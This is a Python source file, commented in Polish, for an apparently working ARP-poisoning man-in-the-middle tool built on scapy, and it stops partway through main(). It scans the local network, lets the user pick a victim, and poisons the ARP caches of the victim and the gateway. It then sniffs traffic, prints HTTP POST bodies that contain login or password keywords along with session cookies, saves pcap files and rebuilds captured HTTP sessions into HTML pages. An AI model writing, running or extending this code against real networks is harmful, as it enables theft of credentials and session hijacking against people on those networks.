#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import argparse
import threading
from datetime import datetime

import netifaces
import scapy.all as scapy
from scapy.layers import http
from scapy.layers.inet import IP, TCP
from scapy.all import ARP, Ether, srp, send, sniff, wrpcap, conf


# Kolorowanie tekstu na konsoli
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    END = '\033[0m'


# Globalne zmienne
captured_packets = []
stop_sniffing = False


def wait_for_key_press(stop_event):
    """Funkcja oczekująca na naciśnięcie klawisza 'p'."""
    global stop_sniffing

    print(f"{Colors.YELLOW}[*] Aby zakończyć przechwytywanie, naciśnij klawisz 'p' i Enter{Colors.END}")

    while not stop_event.is_set():
        try:
            key = input().lower().strip()
            if key == 'p':
                print(f"\n{Colors.YELLOW}[*] Klawisz 'p' naciśnięty. Zatrzymywanie...{Colors.END}")
                stop_event.set()
                stop_sniffing = True
                break
        except Exception as e:
            # Ignorujemy błędy wejścia
            pass
        time.sleep(0.1)


def clear_screen():
    """Czyści ekran konsoli."""
    os.system('cls' if os.name == 'nt' else 'clear')


def get_interfaces():
    """Zwraca listę dostępnych interfejsów sieciowych."""
    valid_interfaces = []

    print(f"{Colors.BLUE}{Colors.BOLD}Dostępne interfejsy sieciowe:{Colors.END}")

    # Dla systemów Windows, użyj scapy do pobrania nazw interfejsów
    if os.name == 'nt':
        try:
            # Pobierz interfejsy z scapy
            from scapy.arch.windows import get_windows_if_list
            win_interfaces = get_windows_if_list()

            for iface in win_interfaces:
                if 'name' in iface and 'ips' in iface and len(iface['ips']) > 0:
                    # Szukaj tylko adresów IPv4 (bez ':' charakterystycznych dla IPv6)
                    for ip in iface['ips']:
                        if not ip.startswith('169.254') and ':' not in ip:  # Pomiń link-local adresy i IPv6
                            valid_interfaces.append((iface['name'], ip))
                            print(f"{Colors.GREEN}{iface['name']} - {ip}{Colors.END}")
                            break
        except Exception as e:
            print(f"{Colors.RED}[!] Błąd podczas pobierania interfejsów Windows: {e}{Colors.END}")
            # Fallback do netifaces
            return get_interfaces_netifaces()
    else:
        # Dla systemów Unix, użyj netifaces
        return get_interfaces_netifaces()

    return valid_interfaces


def get_interfaces_netifaces():
    """Alternatywna metoda pobierania interfejsów, używająca netifaces."""
    interfaces = netifaces.interfaces()
    valid_interfaces = []

    for iface in interfaces:
        try:
            addrs = netifaces.ifaddresses(iface)
            # Sprawdź czy interfejs ma przypisany adres IPv4
            if netifaces.AF_INET in addrs:
                ip = addrs[netifaces.AF_INET][0]['addr']
                # Upewnij się, że to IPv4
                if ':' not in ip:
                    valid_interfaces.append((iface, ip))
                    print(f"{Colors.GREEN}{iface} - {ip}{Colors.END}")
        except Exception as e:
            pass

    return valid_interfaces


def select_interface(interfaces):
    """Umożliwia użytkownikowi wybór interfejsu do monitorowania."""
    # Wyświetl interfejsy z numeracją od 1
    print(f"\n{Colors.BLUE}{Colors.BOLD}Wybierz interfejs:{Colors.END}")
    for i, interface in enumerate(interfaces):
        print(f"{Colors.YELLOW}{i + 1}.{Colors.END} {interface[0]} - {interface[1]}")

    while True:
        try:
            choice = int(input(f"\n{Colors.YELLOW}Wybierz numer interfejsu: {Colors.END}"))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print(f"{Colors.RED}Nieprawidłowy wybór. Spróbuj ponownie.{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}Wprowadź liczbę.{Colors.END}")


def get_network_range(ip):
    """Zwraca zakres sieci na podstawie adresu IP."""
    network = '.'.join(ip.split('.')[:3]) + '.0/24'
    return network


def scan_network(network):
    """Skanuje sieć i zwraca listę aktywnych hostów."""
    print(f"\n{Colors.BLUE}{Colors.BOLD}Skanowanie sieci {network}...{Colors.END}")

    # Tworzenie pakietu ARP do skanowania sieci
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    # Wysyłanie pakietów i zbieranie odpowiedzi
    result = srp(packet, timeout=3, verbose=0)[0]

    # Zbieranie informacji o hostach
    hosts = []
    for sent, received in result:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})

    return hosts


def display_hosts(hosts):
    """Wyświetla listę znalezionych hostów."""
    print(f"\n{Colors.BLUE}{Colors.BOLD}Znalezione hosty w sieci:{Colors.END}")
    print(f"{Colors.BOLD}Nr | IP\t\t\t| MAC Address{Colors.END}")
    print("-" * 60)

    for i, host in enumerate(hosts):
        print(f"{i + 1}  | {host['ip']}\t\t| {host['mac']}")

    return hosts


def select_target(hosts):
    """Pozwala użytkownikowi wybrać hosta do monitorowania."""
    while True:
        try:
            choice = int(input(f"\n{Colors.YELLOW}Wybierz numer hosta do monitorowania: {Colors.END}"))
            if 1 <= choice <= len(hosts):
                return hosts[choice - 1]
            else:
                print(f"{Colors.RED}Nieprawidłowy wybór. Spróbuj ponownie.{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}Wprowadź liczbę.{Colors.END}")


def get_gateway():
    """Zwraca adres IP i MAC bramy domyślnej."""
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET]
        gateway_ip = default_gateway[0]

        # Pobierz MAC adres bramy
        arp_request = ARP(pdst=gateway_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        answered = srp(packet, timeout=2, verbose=0)[0]
        gateway_mac = answered[0][1].hwsrc

        return {'ip': gateway_ip, 'mac': gateway_mac}
    except Exception as e:
        print(f"{Colors.RED}Błąd podczas pobierania informacji o bramie: {e}{Colors.END}")
        sys.exit(1)


def arp_spoof(target_ip, target_mac, spoof_ip):
    """Wykonuje ARP poisoning na celu."""
    try:
        # Tworzymy pakiet ARP "is-at" (op=2)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # Dodajemy warstwę Ethernet, aby uniknąć ostrzeżeń
        ether = Ether(dst=target_mac)
        # Wysyłamy pakiet
        send(ether / packet, verbose=0)
    except Exception as e:
        print(f"{Colors.RED}[!] Błąd podczas ARP spoofing: {e}{Colors.END}")


def restore_arp(destination_ip, destination_mac, source_ip, source_mac):
    """Przywraca oryginalne wpisy ARP."""
    try:
        # Tworzymy pakiet ARP "is-at" (op=2)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        # Dodajemy warstwę Ethernet, aby uniknąć ostrzeżeń
        ether = Ether(dst=destination_mac)
        # Wysyłamy pakiet
        send(ether / packet, count=5, verbose=0)
    except Exception as e:
        print(f"{Colors.RED}[!] Błąd podczas przywracania tablic ARP: {e}{Colors.END}")


def start_arp_spoofing(target, gateway, stop_event):
    """Rozpoczyna proces ARP poisoning w osobnym wątku."""
    print(f"\n{Colors.GREEN}Rozpoczynam ARP poisoning...{Colors.END}")
    try:
        packet_count = 0
        while not stop_event.is_set():
            # Wysyłanie pakietów ARP do celu (cel myśli, że jesteśmy bramą)
            arp_spoof(target['ip'], target['mac'], gateway['ip'])
            # Wysyłanie pakietów ARP do bramy (brama myśli, że jesteśmy celem)
            arp_spoof(gateway['ip'], gateway['mac'], target['ip'])

            packet_count += 2
            if packet_count % 20 == 0:
                print(f"{Colors.YELLOW}[+] Wysłano {packet_count} pakietów ARP{Colors.END}", end='\r')

            # Opóźnienie, aby nie przeciążać sieci
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n{Colors.GREEN}Zatrzymywanie ARP poisoning i przywracanie oryginalnych tabel ARP...{Colors.END}")
        restore_arp(target['ip'], target['mac'], gateway['ip'], gateway['mac'])
        restore_arp(gateway['ip'], gateway['mac'], target['ip'], target['mac'])


def process_packet(packet):
    """Przetwarza przechwycone pakiety i wyodrębnia interesujące informacje."""
    global captured_packets

    if stop_sniffing:
        return

    # Nie dodajemy pakietu tutaj, ponieważ teraz dodajemy je w funkcji sniff_packets
    # captured_packets.append(packet)

    try:
        # Wyświetl podstawowe informacje o pakiecie
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            protocol = packet[IP].proto

            # Jeśli to pakiet TCP
            if TCP in packet:
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport

                # Wykrywanie nagłówków HTTP
                if packet.haslayer(http.HTTPRequest):
                    try:
                        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                        method = packet[http.HTTPRequest].Method.decode()
                        print(
                            f"{Colors.GREEN}[HTTP] {src_ip}:{src_port} -> {dst_ip}:{dst_port} | {method} {url}{Colors.END}")

                        # Wyszukiwanie potencjalnych loginów i haseł
                        if packet.haslayer(scapy.Raw):
                            try:
                                load = packet[scapy.Raw].load.decode(errors='ignore')
                                keywords = ['username', 'user', 'login', 'password', 'pass', 'email', 'credential']
                                for keyword in keywords:
                                    if keyword in load.lower():
                                        print(f"{Colors.RED}[+] Potencjalne dane logowania: {load}{Colors.END}")
                                        break
                            except Exception as e:
                                pass

                        # Wyciąganie cookies
                        if 'Cookie' in packet[http.HTTPRequest].fields:
                            try:
                                cookie = packet[http.HTTPRequest].Cookie.decode()
                                print(f"{Colors.YELLOW}[+] Cookie: {cookie}{Colors.END}")
                            except Exception as e:
                                pass
                    except Exception as e:
                        print(f"{Colors.RED}[!] Błąd podczas przetwarzania pakietu HTTP: {e}{Colors.END}")

                # Wykrywanie różnych popularnych usług na podstawie portów
                elif dst_port == 443 or src_port == 443:
                    print(f"{Colors.BLUE}[HTTPS] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 80 or src_port == 80:
                    print(f"{Colors.BLUE}[HTTP] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 25 or src_port == 25:
                    print(f"{Colors.BLUE}[SMTP] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 110 or src_port == 110:
                    print(f"{Colors.BLUE}[POP3] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 143 or src_port == 143:
                    print(f"{Colors.BLUE}[IMAP] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 22 or src_port == 22:
                    print(f"{Colors.BLUE}[SSH] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 53 or src_port == 53:
                    print(f"{Colors.BLUE}[DNS] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
                elif dst_port == 21 or src_port == 21:
                    print(f"{Colors.BLUE}[FTP] {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Błąd podczas przetwarzania pakietu: {e}{Colors.END}")


def sniff_packets(interface, stop_event):
    """Przechwytuje pakiety na wybranym interfejsie."""
    global stop_sniffing, captured_packets

    print(f"\n{Colors.GREEN}Rozpoczynam przechwytywanie pakietów na interfejsie {interface}...{Colors.END}")

    # Utworzenie wątku do nasłuchiwania klawisza 'p'
    key_thread = threading.Thread(target=wait_for_key_press, args=(stop_event,))
    key_thread.daemon = True
    key_thread.start()

    try:
        # W Windows może być konieczne użycie conf.iface
        if os.name == 'nt':
            # Przechowaj oryginalny interfejs
            original_iface = conf.iface
            conf.iface = interface
            print(f"{Colors.YELLOW}[*] Ustawiono interfejs scapy na: {conf.iface}{Colors.END}")

        # Używamy pętli, aby kontynuować przechwytywanie do momentu przerwania
        packet_count = 0
        while not stop_event.is_set() and not stop_sniffing:
            try:
                # Przechwytujemy małe partie pakietów naraz
                new_packets = sniff(store=True, count=10, prn=process_packet, timeout=1)

                if new_packets:
                    captured_packets.extend(new_packets)
                    packet_count += len(new_packets)
                    print(f"{Colors.YELLOW}[+] Przechwycono {packet_count} pakietów{Colors.END}", end='\r')
            except Exception as inner_e:
                print(f"\n{Colors.RED}[!] Błąd podczas partii przechwytywania: {inner_e}{Colors.END}")

            # Małe opóźnienie, aby nie obciążać CPU
            time.sleep(0.1)

        # Przywróć oryginalny interfejs
        if os.name == 'nt':
            conf.iface = original_iface
    except Exception as e:
        print(f"\n{Colors.RED}[!] Błąd podczas przechwytywania: {e}{Colors.END}")
    finally:
        stop_sniffing = True
        stop_event.set()


def save_packets(filename):
    """Zapisuje przechwycone pakiety do pliku pcap."""
    global captured_packets

    try:
        if not filename.endswith('.pcap'):
            filename += '.pcap'

        wrpcap(filename, captured_packets)
        print(f"\n{Colors.GREEN}Zapisano {len(captured_packets)} pakietów do pliku {filename}{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Błąd podczas zapisywania pakietów: {e}{Colors.END}")


def extract_http_sessions(packets):
    """Ekstrahuje sesje HTTP z przechwyconych pakietów - wersja uproszczona."""
    sessions = {}
    requests_by_stream = {}

    print(f"{Colors.YELLOW}[*] Rozpoczynam analizę pakietów HTTP...{Colors.END}")

    # Przeanalizuj pakiety pod kątem żądań HTTP
    for packet in packets:
        if IP in packet and TCP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport

            # Sprawdź czy to pakiet HTTP
            is_http_request = packet.haslayer(http.HTTPRequest)
            is_http_response = (src_port == 80 or src_port == 443) and packet.haslayer(scapy.Raw)

            # Dla żądań HTTP
            if is_http_request:
                stream_id = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"

                # Tworzenie nowej sesji jeśli nie istnieje
                if stream_id not in sessions:
                    sessions[stream_id] = {
                        "client_ip": src_ip,
                        "server_ip": dst_ip,
                        "requests": [],
                        "responses": [],
                        "timestamp": packet.time
                    }

                # Ekstrakcja danych z żądania HTTP
                host = ""
                path = ""
                method = ""
                headers = {}
                post_data = ""

                try:
                    host = packet[http.HTTPRequest].Host.decode() if hasattr(packet[http.HTTPRequest], 'Host') else ""
                    path = packet[http.HTTPRequest].Path.decode() if hasattr(packet[http.HTTPRequest], 'Path') else ""
                    method = packet[http.HTTPRequest].Method.decode() if hasattr(packet[http.HTTPRequest],
                                                                                 'Method') else ""

                    # Pobieranie nagłówków
                    for field in packet[http.HTTPRequest].fields:
                        if field != 'Method' and field != 'Path' and field != 'Http-Version':
                            try:
                                headers[field] = packet[http.HTTPRequest].fields[field].decode()
                            except:
                                pass

                    # Dane POST
                    if packet.haslayer(scapy.Raw) and method == "POST":
                        try:
                            post_data = packet[scapy.Raw].load.decode(errors='ignore')
                        except:
                            pass
                except Exception as e:
                    print(f"{Colors.RED}[!] Błąd podczas przetwarzania żądania HTTP: {e}{Colors.END}")

                # Dodanie żądania do sesji
                request = {
                    "host": host,
                    "path": path,
                    "method": method,
                    "headers": headers,
                    "post_data": post_data,
                    "timestamp": packet.time
                }

                sessions[stream_id]["requests"].append(request)
                requests_by_stream[stream_id] = True
                print(f"{Colors.GREEN}[+] Dodano żądanie: {method} {host}{path}{Colors.END}")

            # Dla odpowiedzi HTTP
            elif is_http_response:
                # Próba znalezienia odpowiadającego strumienia - odwracamy kierunek
                stream_id = f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"

                # Jeśli nie znaleziono żądania, utwórz nową sesję
                if stream_id not in sessions:
                    # Sprawdź, czy znajdziemy sesję pasującą do tego IP
                    found = False
                    for sid, session in sessions.items():
                        if session["server_ip"] == src_ip:
                            stream_id = sid
                            found = True
                            break

                    if not found:
                        # Utwórz nową sesję tylko dla odpowiedzi
                        sessions[stream_id] = {
                            "client_ip": dst_ip,
                            "server_ip": src_ip,
                            "requests": [],
                            "responses": [],
                            "timestamp": packet.time
                        }

                # Ekstrakcja danych z odpowiedzi HTTP
                try:
                    raw_data = packet[scapy.Raw].load

                    # Sprawdź czy to wygląda jak początek odpowiedzi HTTP
                    if raw_data.startswith(b"HTTP/"):
                        # Podział na nagłówki i treść
                        header_end = raw_data.find(b"\r\n\r\n")
                        if header_end > 0:
                            headers_raw = raw_data[:header_end].decode(errors='ignore')
                            body = raw_data[header_end + 4:]

                            # Parsowanie linii statusu i nagłówków
                            headers = {}
                            status_line = ""

                            for i, line in enumerate(headers_raw.split("\r\n")):
                                if i == 0:
                                    status_line = line  # np. "HTTP/1.1 200 OK"
                                else:
                                    if ": " in line:
                                        key, value = line.split(": ", 1)
                                        headers[key] = value

                            response = {
                                "status": status_line,
                                "headers": headers,
                                "body": body,
                                "timestamp": packet.time
                            }

                            sessions[stream_id]["responses"].append(response)

                            # Wypisz status odpowiedzi
                            status_code = status_line.split(" ")[1] if len(status_line.split(" ")) > 1 else "???"
                            print(f"{Colors.GREEN}[+] Dodano odpowiedź: {status_code} ({len(body)} bajtów){Colors.END}")
                    else:
                        # Jeśli to nie jest początek odpowiedzi, sprawdź czy możemy dodać go do istniejącej odpowiedzi
                        if stream_id in sessions and sessions[stream_id]["responses"]:
                            last_response = sessions[stream_id]["responses"][-1]
                            last_response["body"] += raw_data
                except Exception as e:
                    print(f"{Colors.RED}[!] Błąd podczas przetwarzania odpowiedzi HTTP: {e}{Colors.END}")

    # Usuwanie pustych sesji i sesji bez kompletnych danych
    sessions_to_remove = []
    for stream_id, session in sessions.items():
        if not session["requests"] and not session["responses"]:
            sessions_to_remove.append(stream_id)

    for stream_id in sessions_to_remove:
        del sessions[stream_id]

    print(f"{Colors.GREEN}[+] Zakończono parsowanie. Znaleziono {len(sessions)} sesji HTTP.{Colors.END}")

    # Jeśli nie znaleziono żadnych sesji, spróbuj utworzyć "sztuczne" sesje z pojedynczych pakietów HTTP
    if not sessions:
        print(f"{Colors.YELLOW}[*] Próba utworzenia sesji z pojedynczych pakietów HTTP...{Colors.END}")

        http_packets = []
        for packet in packets:
            if (IP in packet and TCP in packet and
                    (packet.haslayer(http.HTTPRequest) or
                     (packet.haslayer(scapy.Raw) and packet[scapy.Raw].load.startswith(b"HTTP/")))):
                http_packets.append(packet)

        if http_packets:
            session_id = "reconstructed_session"
            sessions[session_id] = {
                "client_ip": http_packets[0][IP].src,
                "server_ip": http_packets[0][IP].dst,
                "requests": [],
                "responses": [],
                "timestamp": http_packets[0].time
            }

            for packet in http_packets:
                if packet.haslayer(http.HTTPRequest):
                    # To jest żądanie HTTP
                    try:
                        host = packet[http.HTTPRequest].Host.decode() if hasattr(packet[http.HTTPRequest],
                                                                                 'Host') else ""
                        path = packet[http.HTTPRequest].Path.decode() if hasattr(packet[http.HTTPRequest],
                                                                                 'Path') else ""
                        method = packet[http.HTTPRequest].Method.decode() if hasattr(packet[http.HTTPRequest],
                                                                                     'Method') else ""

                        request = {
                            "host": host,
                            "path": path,
                            "method": method,
                            "headers": {},
                            "post_data": "",
                            "timestamp": packet.time
                        }

                        sessions[session_id]["requests"].append(request)
                        print(f"{Colors.GREEN}[+] Dodano żądanie z rekonstrukcji: {method} {host}{path}{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.RED}[!] Błąd podczas rekonstrukcji żądania: {e}{Colors.END}")

                elif packet.haslayer(scapy.Raw) and packet[scapy.Raw].load.startswith(b"HTTP/"):
                    # To jest odpowiedź HTTP
                    try:
                        raw_data = packet[scapy.Raw].load

                        # Bardzo uproszczone parsowanie
                        header_end = raw_data.find(b"\r\n\r\n")
                        if header_end > 0:
                            headers_raw = raw_data[:header_end].decode(errors='ignore')
                            body = raw_data[header_end + 4:] if header_end + 4 < len(raw_data) else b""

                            status_line = headers_raw.split("\r\n")[0]

                            response = {
                                "status": status_line,
                                "headers": {},
                                "body": body,
                                "timestamp": packet.time
                            }

                            sessions[session_id]["responses"].append(response)
                            print(f"{Colors.GREEN}[+] Dodano odpowiedź z rekonstrukcji: {status_line}{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.RED}[!] Błąd podczas rekonstrukcji odpowiedzi: {e}{Colors.END}")

            print(
                f"{Colors.GREEN}[+] Utworzono {len(sessions[session_id]['requests'])} żądań i {len(sessions[session_id]['responses'])} odpowiedzi z rekonstrukcji.{Colors.END}")

    return sessions


def generate_session_html(sessions, output_dir):
    """Generuje pliki HTML dla każdej sesji HTTP - wersja tolerująca niekompletne dane."""
    import os
    import json
    from datetime import datetime

    # Tworzenie katalogu wyjściowego jeśli nie istnieje
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Tworzenie pliku indeksu
    index_file = os.path.join(output_dir, "index.html")

    with open(index_file, "w", encoding="utf-8") as f:
        f.write("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Przechwycone sesje HTTP</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        tr:hover { background-color: #e9e9e9; }
        .header { background-color: #4CAF50; color: white; padding: 15px; }
        .session-link { color: #0066cc; text-decoration: none; }
        .session-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Przechwycone sesje HTTP</h1>
    </div>
    <table>
        <tr>
            <th>Lp.</th>
            <th>Klient</th>
            <th>Serwer</th>
            <th>Liczba żądań</th>
            <th>Liczba odpowiedzi</th>
            <th>Czas</th>
            <th>Akcje</th>
        </tr>
""")

        # Sortowanie sesji według czasu
        sorted_sessions = sorted(sessions.items(), key=lambda x: x[1]["timestamp"])

        for i, (session_id, session) in enumerate(sorted_sessions):
            session_file = f"session_{i + 1}.html"
            timestamp = datetime.fromtimestamp(session["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")

            f.write(f"""
        <tr>
            <td>{i + 1}</td>
            <td>{session["client_ip"]}</td>
            <td>{session["server_ip"]}</td>
            <td>{len(session["requests"])}</td>
            <td>{len(session["responses"])}</td>
            <td>{timestamp}</td>
            <td><a href="{session_file}" class="session-link">Zobacz szczegóły</a></td>
        </tr>
""")

            # Tworzenie pliku szczegółowego dla każdej sesji
            session_path = os.path.join(output_dir, session_file)

            with open(session_path, "w", encoding="utf-8") as sf:
                sf.write(f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sesja {i + 1} - Szczegóły</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        pre {{ background-color: #f5f5f5; padding: 10px; overflow: auto; }}
        .header {{ background-color: #4CAF50; color: white; padding: 15px; }}
        .back-link {{ margin-top: 20px; display: inline-block; }}
        .request-response {{ border: 1px solid #ddd; margin: 10px 0; padding: 10px; background-color: #f9f9f9; }}
        .request {{ background-color: #e6f3ff; }}
        .response {{ background-color: #e6ffe6; }}
        .tabs {{ display: flex; margin-bottom: -1px; }}
        .tab {{ padding: 10px 15px; cursor: pointer; border: 1px solid #ddd; background-color: #f1f1f1; margin-right: 5px; }}
        .tab.active {{ background-color: white; border-bottom: 1px solid white; }}
        .tab-content {{ display: none; border: 1px solid #ddd; padding: 15px; }}
        .tab-content.active {{ display: block; }}
        iframe {{ width: 100%; height: 500px; border: 1px solid #ddd; }}
        .rendered {{ margin-top: 20px; }}
        h2 {{ color: #4CAF50; }}
        .warning {{ color: #ff6600; background-color: #fff3e0; padding: 10px; border-left: 5px solid #ff6600; margin: 10px 0; }}
    </style>
    <script>
        function openTab(evt, tabName) {{
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tab-content");
            for (i = 0; i < tabcontent.length; i++) {{
                tabcontent[i].className = tabcontent[i].className.replace(" active", "");
            }}
            tablinks = document.getElementsByClassName("tab");
            for (i = 0; i < tablinks.length; i++) {{
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }}
            document.getElementById(tabName).className += " active";
            evt.currentTarget.className += " active";
        }}
    </script>
</head>
<body>
    <div class="header">
        <h1>Szczegóły sesji {i + 1}</h1>
        <p>Klient: {session["client_ip"]} | Serwer: {session["server_ip"]}</p>
    </div>
""")

                # Jeśli liczba żądań nie jest równa liczbie odpowiedzi, wyświetl ostrzeżenie
                if len(session["requests"]) != len(session["responses"]):
                    sf.write(f"""
    <div class="warning">
        <p><strong>Uwaga:</strong> Liczba żądań ({len(session["requests"])}) nie odpowiada liczbie odpowiedzi ({len(session["responses"])}). 
        Rekonstrukcja sesji może być niekompletna.</p>
    </div>
""")

                # Przetwarzanie wszystkich żądań
                for req_idx, request in enumerate(session["requests"]):
                    req_time = datetime.fromtimestamp(request["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
                    req_url = f"{request['host']}{request['path']}"

                    sf.write(f"""
    <div class="request-response request">
        <h2>Żądanie {req_idx + 1} ({req_time})</h2>
        <div class="tabs">
            <button class="tab active" onclick="openTab(event, 'req-details-{req_idx}')">Szczegóły</button>
            <button class="tab" onclick="openTab(event, 'req-headers-{req_idx}')">Nagłówki</button>
            <button class="tab" onclick="openTab(event, 'req-data-{req_idx}')">Dane</button>
        </div>

        <div id="req-details-{req_idx}" class="tab-content active">
            <p><strong>URL:</strong> {request['method']} {req_url}</p>
            <p><strong>Host:</strong> {request['host']}</p>
            <p><strong>Ścieżka:</strong> {request['path']}</p>
            <p><strong>Metoda:</strong> {request['method']}</p>
        </div>

        <div id="req-headers-{req_idx}" class="tab-content">
            <pre>{json.dumps(request['headers'], indent=4)}</pre>
        </div>

        <div id="req-data-{req_idx}" class="tab-content">
            <pre>{request['post_data']}</pre>
        </div>
    </div>
""")

                # Przetwarzanie wszystkich odpowiedzi (niezależnie od żądań)
                for resp_idx, response in enumerate(session["responses"]):
                    resp_time = datetime.fromtimestamp(response["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")

                    # Określenie typu odpowiedzi
                    content_type = "text/plain"
                    for key, value in response["headers"].items():
                        if key.lower() == "content-type":
                            content_type = value.split(";")[0]
                            break

                    # Tworzenie pliku z zawartością odpowiedzi dla iframe
                    response_content_filename = f"response_{i + 1}_{resp_idx + 1}.html"
                    response_content_path = os.path.join(output_dir, response_content_filename)

                    try:
                        with open(response_content_path, "wb") as rf:
                            # Zapisz treść odpowiedzi w czystej formie
                            if isinstance(response["body"], bytes):
                                rf.write(response["body"])
                            else:
                                rf.write(response["body"].encode('utf-8', errors='ignore'))
                    except Exception as e:
                        print(f"{Colors.RED}[!] Błąd podczas zapisywania treści odpowiedzi: {e}{Colors.END}")

                    # Kod statusu
                    try:
                        status_parts = response["status"].split(" ")
                        status_code = status_parts[1] if len(status_parts) > 1 else "???"
                        status_text = " ".join(status_parts[2:]) if len(status_parts) > 2 else "???"
                    except:
                        status_code = "???"
                        status_text = "???"

                    sf.write(f"""
    <div class="request-response response">
        <h2>Odpowiedź {resp_idx + 1} ({resp_time})</h2>
        <div class="tabs">
            <button class="tab active" onclick="openTab(event, 'resp-details-{resp_idx}')">Szczegóły</button>
            <button class="tab" onclick="openTab(event, 'resp-headers-{resp_idx}')">Nagłówki</button>
            <button class="tab" onclick="openTab(event, 'resp-body-{resp_idx}')">Treść</button>
            <button class="tab" onclick="openTab(event, 'resp-rendered-{resp_idx}')">Podgląd</button>
        </div>

        <div id="resp-details-{resp_idx}" class="tab-content active">
            <p><strong>Status:</strong> {status_code} {status_text}</p>
            <p><strong>Typ treści:</strong> {content_type}</p>
            <p><strong>Rozmiar:</strong> {len(response["body"]) if isinstance(response["body"], bytes) else len(response["body"].encode('utf-8'))} bajtów</p>
        </div>

        <div id="resp-headers-{resp_idx}" class="tab-content">
            <pre>{json.dumps(response["headers"], indent=4)}</pre>
        </div>

        <div id="resp-body-{resp_idx}" class="tab-content">
            <pre>""")

                    # Dodanie treści odpowiedzi
                    try:
                        if isinstance(response["body"], bytes):
                            # Dla contentu binarnego, spróbuj zdekodować, jeśli to HTML/text
                            if content_type.startswith(
                                    ("text/", "application/json", "application/xml", "application/javascript")):
                                body_text = response["body"].decode('utf-8', errors='ignore')
                                sf.write(body_text.replace("<", "&lt;").replace(">", "&gt;"))
                            else:
                                sf.write("[Treść binarna]")
                        else:
                            sf.write(response["body"].replace("<", "&lt;").replace(">", "&gt;"))
                    except Exception as e:
                        sf.write(f"[Błąd podczas wyświetlania treści: {e}]")

                    sf.write("""</pre>
        </div>

        <div id="resp-rendered-{resp_idx}" class="tab-content">
            <div class="rendered">
""")
                    # Tylko dla odpowiedzi HTML wyświetl iframe
                    if content_type.startswith("text/html"):
                        sf.write(f"""
                <iframe src="{response_content_filename}"></iframe>
""")
                    else:
                        sf.write(f"""
                <p>Podgląd jest dostępny tylko dla zawartości HTML. Ten content jest typu: {content_type}</p>
""")

                    sf.write("""
            </div>
        </div>
    </div>
""")

            # Zamknięcie pliku sesji
            sf.write("""
    <div class="back-link">
        <a href="index.html">Powrót do listy sesji</a>
    </div>
</body>
</html>
""")

    # Zamknięcie pliku indeksu
    f.write("""
    </table>
</body>
</html>
""")


    return index_file


def save_http_sessions(packets, output_dir):
    """Zapisuje przechwycone sesje HTTP do odtworzenia w przeglądarce."""
    print(f"\n{Colors.GREEN}[*] Przetwarzanie przechwyconych pakietów HTTP...{Colors.END}")

    # Ekstrakcja sesji HTTP
    sessions = extract_http_sessions(packets)

    if not sessions:
        print(f"{Colors.YELLOW}[!] Nie znaleziono żadnych sesji HTTP.{Colors.END}")
        return None

    print(f"{Colors.GREEN}[+] Znaleziono {len(sessions)} sesji HTTP.{Colors.END}")

    # Generowanie plików HTML
    index_file = generate_session_html(sessions, output_dir)

    print(f"{Colors.GREEN}[+] Zapisano pliki sesji w katalogu: {output_dir}{Colors.END}")
    print(f"{Colors.GREEN}[+] Otwórz plik {index_file} w przeglądarce, aby przejrzeć sesje.{Colors.END}")

    return index_file

def main():
    """Główna funkcja programu."""
    clear_screen()

    print(f"""
{Colors.BOLD}{Colors.BLUE}======================================================{Colors.END}
